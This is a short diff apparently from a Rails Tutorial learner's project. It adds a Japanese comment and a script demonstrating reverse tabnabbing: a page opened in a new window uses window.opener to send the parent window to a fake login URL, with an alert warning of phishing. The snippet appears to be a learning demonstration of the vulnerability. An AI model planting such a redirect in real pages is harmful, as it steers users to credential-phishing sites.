@@ -6,3 +6,11 @@
   <a href="https://railstutorial.jp/#ebook"><em>Ruby on Rails Tutorial</em>
   book</a>.
 </p>
+
+<!--遷移先の別ウィンドウ内に以下のスクリプトを仕込むと親ウィンドウのリンクが変わる（フィッシング詐欺で別サイトに飛ばされる）-->
+<script>
+  if (window.opener) {
+    window.alert('window.openerによりフィッシング詐欺の可能性があります')
+	  window.opener.location="https://985b960af22941169449f5a59b363c0c.vfs.cloud9.ap-northeast-1.amazonaws.com/loginFAKE"
+  }
+</script>
